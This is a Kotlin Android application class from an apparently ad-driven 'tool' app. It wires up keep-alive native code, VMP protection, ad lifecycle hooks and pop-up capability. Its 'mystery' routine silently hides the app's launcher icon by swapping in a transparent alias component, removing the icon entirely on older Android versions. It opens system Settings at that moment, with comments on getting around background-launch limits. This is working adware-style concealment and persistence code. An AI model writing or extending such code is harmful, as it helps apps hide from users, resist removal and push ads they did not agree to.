package com.deploy

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.deploy.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import com.p.b.base.APPContext
import com.p.b.base.OverseaAppHost
import com.p.b.base.OverseaAppInitializer
import com.p.b.ad.runtime.AdLifecycleInstaller
import com.p.b.common.LogUtil
import com.p.b.common.MMKVUtils


class TheApplication : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        private const val TAG = "TheApplication"

        /** MMKV key：图标切换+跳设置 待执行标记(跨进程持久化，防进程死亡丢失) */
        private const val KEY_PENDING_MYSTERY = "pending_mystery_switch"

        /** 兜底定时器：置标记后最长等待首个可见 Activity 的时长 */
        private const val FALLBACK_TIMEOUT_MS = 10_000L

        @JvmStatic
        var insApp: TheApplication? = null

        /** 读取持久化的待执行标记(进程重启后仍可恢复) */
        @JvmStatic
        fun hasPendingMystery(): Boolean =
            MMKVUtils.getBoolean(KEY_PENDING_MYSTERY, false)
    }

    /** 当前已 started 未 stopped 的 Activity 数量，>0 即存在可见窗口 */
    private var startedActivityCount = 0

    /** 进程内执行闩：initMystery 是唯一执行入口，base 1s 定时器/跨会话恢复/
     *  resumed 触发/10s 兜底都只是触发者——本进程内"跳设置+切图标"至多执行一次，
     *  谁先到谁执行，后到者被闩住空跑(3.log 双执行场景的结构性修复)。 */
    private var mysteryActionDone = false

    /** 兜底定时器(仅执行一次切换) */
    private val mainHandler = Handler(Looper.getMainLooper())
    private var fallbackRunnable: Runnable? = null

    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        StartHelper.initVmp()
    }

    override fun onCreate() {
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
        // 监听 Activity 生命周期：onActivityResumed 只是"触发者"，不是执行者——
        // 消费点不能固定在某个 Activity(如 Splash)——归因回调与 Splash 渲染是竞态，
        // 且切换组件会中止启动中的 Splash(禁用其组件导致 mid-launch 被掐断)。
        // 因此任意首个 resumed 的 Activity 只负责"唤醒" initMystery 单一执行入口
        // (此刻窗口合法，startActivity 不受 BAL 限制)，跳设置/切换的执行逻辑
        // 只存在于 executeMystery 一处，与 base 侧 1s 延迟触发互斥去重。
        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
            override fun onActivityResumed(activity: Activity) {
                if (hasPendingMystery()) {
                    LogUtil.d(TAG, "检测到待执行标记，触发 initMystery 单一入口消费")
                    initMystery()
                }
            }

            override fun onActivityStarted(activity: Activity) {
                startedActivityCount++
            }

            override fun onActivityStopped(activity: Activity) {
                startedActivityCount = maxOf(0, startedActivityCount - 1)
            }

            override fun onActivityPaused(activity: Activity) {}
            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
            override fun onActivityDestroyed(activity: Activity) {}
            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
        })
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        // 纯 pop 能力初始化(与图标隐藏语义分离，2026-10-09)：
        // 图标隐藏已迁至 initMystery()，由 OverseaAppInitializer 的独立 "mystery"
        // postinit 步骤置标记并延迟 1s 调用，保证归因打点与后置主链打点先落盘。
        StartHelper.init(this)
    }

    override fun initMystery() {
        // 图标切换"跳转前置"方案——**唯一执行入口**，由两类触发者调用：
        //   ① base 侧 OverseaAppInitializer 延迟 1s 调用(归因打点落盘窗口已过)；
        //   ② 本类 onActivityResumed 检测到残留标记时触发(窗口合法，BAL 放行)。
        // 多触发者竞态由 executeMystery 顶部的进程内闩去重，本方法无需自行判重。
        // 分支语义：
        // ① 当前已有可见 Activity → 立即执行(跳设置+切换)，startActivity 不受 BAL 限制；
        // ② 冷启动早期(无可见窗口) → 只置持久化标记，禁止此时切换组件——
        //    切换(禁用 SplashActivity)会中止 mid-launch 的 Splash；标记由后续
        //    resumed 触发本入口消费，另设兜底定时器：纯后台场景(无任何 Activity
        //    会 resume)超时后只执行切换不跳设置，保证图标功能不丢。
        if (startedActivityCount > 0) {
            LogUtil.d(TAG, "已有可见 Activity，立即执行跳设置+切换")
            executeMystery(this, jumpSettings = true)
        } else {
            LogUtil.d(TAG, "暂无可见 Activity，置持久化标记等待消费")
            markPendingMystery()
        }
    }


    override fun initKeepPower(app: Application) {
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

    /** 置持久化标记并启动兜底定时器 */
    private fun markPendingMystery() {
        MMKVUtils.putBoolean(KEY_PENDING_MYSTERY, true)
        cancelFallback()
        val runnable = Runnable {
            // 兜底：超时仍无 Activity 消费(纯后台场景)，只执行切换不跳设置
            if (hasPendingMystery()) {
                LogUtil.d(TAG, "兜底定时器触发：超时无可见 Activity，仅执行图标切换")
                executeMystery(this, jumpSettings = false)
            }
        }
        fallbackRunnable = runnable
        mainHandler.postDelayed(runnable, FALLBACK_TIMEOUT_MS)
    }

    /** 立即执行(已可见场景/兜底场景共用)：与消费路径同序——先跳设置，再切换。
     *  进程内闩在此置位：所有触发路径(resumed/base 1s/recover/兜底)最终都收敛到
     *  本函数，本进程只放行第一次，后续触发空跑返回(双执行的结构性防线)。 */
    private fun executeMystery(context: Context, jumpSettings: Boolean) {
        if (mysteryActionDone) {
            LogUtil.d(TAG, "本进程已执行过图标动作，跳过重复触发")
            return
        }
        mysteryActionDone = true
        MMKVUtils.putBoolean(KEY_PENDING_MYSTERY, false)
        cancelFallback()
        if (jumpSettings) {
            jumpSettings(context)
        }
        switchIconComponents()
    }

    /** 跳系统设置页。NEW_TASK 使设置页进入自身任务栈，与本应用任务栈解耦，
     *  组件切换触发的 launcher 刷新/任务重排不会牵连设置页，保证其留在前台。 */
    private fun jumpSettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (t: Throwable) {
            // 跳转失败不影响切换(切换才是核心功能)
            LogUtil.e(TAG, "跳转系统设置失败", t)
        }
    }

    /** 切换启动图标：禁用 SplashActivity 主入口，启用透明 MysteryAliasActivity。
     *  组件切换不依赖任何窗口，Application context 即可执行。
     *  包名沿用运行时类名推导，避免硬编码包前缀被混淆后失效(与 MysteryActivity 原实现一致)。 */
    private fun switchIconComponents() {
        try {
            val pkg = MysteryActivity::class.java.name.substringBeforeLast('.')
            val alias = "$pkg.MysteryAliasActivity"
            MysteryActivity.set(this, SplashActivity::class.java.name, alias)
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                // Android 10 以下：再禁用别名，连透明占位图标一并从桌面移除
                MysteryActivity.disableComponent(this, alias)
            }
        } catch (t: Throwable) {
            LogUtil.e(TAG, "图标组件切换失败", t)
        }
    }

    private fun cancelFallback() {
        fallbackRunnable?.let { mainHandler.removeCallbacks(it) }
        fallbackRunnable = null
    }

}
